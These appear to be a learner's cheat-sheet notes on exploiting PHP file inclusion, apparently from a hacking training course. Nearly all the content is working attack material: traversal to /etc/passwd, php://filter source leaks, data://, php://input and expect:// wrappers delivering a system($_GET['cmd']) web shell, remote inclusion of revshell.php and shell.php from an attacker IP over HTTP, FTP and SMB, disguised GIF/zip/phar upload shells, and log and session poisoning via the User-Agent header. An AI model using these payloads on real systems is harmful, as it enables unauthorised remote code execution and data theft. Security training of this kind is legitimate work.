

## Wordlist Paths 
```
/usr/share/seclists/wordlists/LFI/
```
- Functions can be abused to display hidden or confidential files or information 
- [Common PHP Wordlist](https://github.com/charliesalt/WordLists/blob/master/Filenames_PHP_Common.wordlist)
- [HTB Module](https://academy.hackthebox.com/app/module/23/)
- [Linux Raw Inclusion File](https://raw.githubusercontent.com/carlospolop/Auto_Wordlists/refs/heads/main/wordlists/file_inclusion_linux.txt)
- [File_Inclusion_Windows](https://raw.githubusercontent.com/carlospolop/Auto_Wordlists/refs/heads/main/wordlists/file_inclusion_windows.txt)
# Enumeration 

1. Get request 
2. Put it into ffuf request 
3. After putting into ffuf request, see what the most common word length, page length, etc. value is and filter by that value 
4. Save the output that is not common to a file 

## Review code 


``` hlt:../ 
http://ip:port/index.php?language=../etc/passwd

include("./languages/" . $_GET['language']);

```

## File Name Prefix

```
include("lang_" . $_GET['language']); #appended to language paramater

http://ip:port/index.php?language=/../.../../etc/passwd #adding slash before payload considers the prefix as a directory
```



# PHP Wrappers
- Requires resource stream to run the filter over 
- Requires read - which filter to apply to resource on read 
- [PHP Wrapper](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/Wrappers.md#wrapper-phpfilter)
## Enumeration 
- Fuzz for interesting pages 
- Identify vulnerable, self configured parameters 
> [!NOTE]  The index.php file is supposed to stay the same 

``` hlt:FUZZ
wget https://raw.githubusercontent.com/charliesalt/WordLists/refs/heads/master/Filenames_PHP_Common.wordlist

echo 'configure.php' >> Filenames_PHP_Common.wordlist

ffuf -w Filenames_PHP_Common.wordlist:FUZZ -u "http://<SERVER_IP>:<PORT>/FUZZ"
  
  # Fuzz for common php file names first 

```

> [!NOTE] Unable to assign variable and use it in the ffuf command
> 

```hlt:configure
ffuf results 
configure.php 
index.php
en.php

```

Add the following, replacing the resource paramater with a page name that exists based on the results above 

```bash
http://<SERVER_IP>:<PORT>/FUZZ 
look at results 
go back to the url with the paramater 
http://10.10.10.10:8000/index.php?language=php://filter/read=convert.base64-encode/resource=configure

```

```php
php://filter/read=convert.base64-encode/resource=configure
```

```bash
echo -n 'value' | base64 -d
```

*Additional Php Filters* 

```shell
http://example.com/index.php?page=php://filter/read=string.rot13/resource=index.php
http://example.com/index.php?page=php://filter/convert.iconv.utf-8.utf-16/resource=index.php
http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
http://example.com/index.php?page=pHp://FilTer/convert.base64-encode/resource=index.php
```



##  Data Wrapper 
- Comes right after the parameter that is chosen by the user 
- To check configurations, must do a curl request that returns the values of the configuration files for that specific server 
```bash
curl "http://url/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
```
```bash
echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include
```
```bash
echo '<?php system($_GET["cmd"]); ?>' | base64

PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
```
``` hlt:data://text/plain
curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid
```


##  Input Wrapper 
- Requests are passed as POST data instead of GET data
- Best if application accepts GET requests 
``` hlt:input&cmd
ex
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid

```

```
--data '<?php system($_GET["cmd"]); ?>'
```


> [!NOTE]  Command is supposed to go at the end. If there is a space, you need to add a + symbol

## Wrapper Expect 


```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```
```
curl -X POST --data "<?php echo shell_exec('id'); ?>" "https://example.com/index.php?page=php://input%00" -k -v
```

# RFI 
- Remote file inclusion is file injection but from a remote server or source 
Enumeration 
```
echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include
```
- Try to replace paramater values with urls 

## HTTP 
```
http://site.com/language?=en

curl http://site.com/language?=http://10.10.15.79:8000/revshell.php
```

## FTP 

```
curl 'http://site.com/index.php?language=ftp://user:pass@<OUR_IP>/shell.php&cmd=id'

curl 'http://site.com/index.php?language=ftp://shell.php&cmd=id'
```


## SMB 
- Should be utilized when it is clear that Microsoft is being used 

```
impacket-smbserver -smb2support share #(pwd) 
```

```
echo '<?php echo system($_REQUEST['cmd']);?>' ≫ shell.php

```

```
http://url/index.php?vuln-param=\\10.10.15.79\share\shell.php&cmd=whoami 

```


# LFI and File Uploads

Malicious Images 
```
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
```


```
<img src="/profile_images/shell.gif" class="profile-image" id="profile-image">
```
- Need to replace language parameter with the location of the shell.gif file and the command you want to execute
- Path to the shell.gif file must be EXACT 
## Zip Upload 
```
echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
```
```
http://<SERVER_IP>:<PORT>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id
```

- shell.php must be url encoded 
# Phar Upload
- Files can be renamed to files that are actually accepted, like with .txt and .jpg endings 

### Creating Phar file 
```bash
<?php
$phar = new Phar('shell.phar'); 
$phar->startBuffering(); 
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>'); 
$phar->setStub('<?php __HALT_COMPILER(); ?>'); 
$phar->stopBuffering();
```

### Compiling phar file 
```
php --define phar.readonly=0 shell.php 
mv shell.phar shell.jpg 
```

### Upload file 

```
http://<SERVER_IP>:<PORT>/index.php?
```


Find out where the image is supposed to be stored 

Visit image at the url 

```
http://<SERVER_IP>:<PORT>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
```


language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id

# PHP Session ID 
## Basics 
- PHPSESSID are cookies that hold special privileges and can be abused and obtained
- Contain various information about all requests made to server, including request's User-Agent header. 
- Once poisoned, need to include logs 
- **Differences**
	- Nginx logs: Readable by unprivileged users 
	- Apache: Only readable by privileged users  
Linux Locations 
	- /varlog/apache2
	- /var/log/nginx 
Windows Locations 
	- C:\xampp\apache\logs
	- C:\nginx\log\ on Windows 
## Check if you have php cookie available 
- Open inspector/storage capabilities 
- Navigate to the url 
`http://url/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd`
- Perform poisioning by changing language parameter to url encoded web shell
- `http://url/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E`

## Try to view the php cookie file value through LFI manipulation or a POST request or GET request 
## Try to add &cmd=id ending to the end of the language paramater, like so 


```hlt:&cmd=id
language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id
```

## Session Poisoning 
- Visit access log 

```
http://url/index.php?language=/var/log/apache2/access.log

http://url/index.php?language=/var/log/nginx/access.log

http://url/index.php?language=/xampp/apache/logs

```
- Change user agent to see what happens as a result 
- Change the User-Agent header to a shell 

```
GET /index.php?language=/var/log/apache2/access.log 

User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.10 Safari/605.1.1

```

``` hl:3
GET /index.php?language=/var/log/apache2/access.log 

User-Agent: <?php system($_GET['cmd]); ?> 

```

``` hl:3
GET /index.php?language=/var/log/apache2/access.log&cmd=id

User-Agent: <?php system($_GET['cmd]); ?> 

```
Additional logs 

```
/var/log/sshd.log
/var/log/mail
/var/log/vsftpd.log

```
# Automated Scanning 

**Find vulnerable parameter **
```bash prompt:kali 
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://SERVER_IP:PORT/index.php?FUZZ=value'
```
**Try to find LFI opportunities for vulnerable parameter**
```bash prompt:kali 
ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://SERVER_IP:PORT/index.php?language=FUZZ' 
```
**Filter out responses that hint at having something interesting **
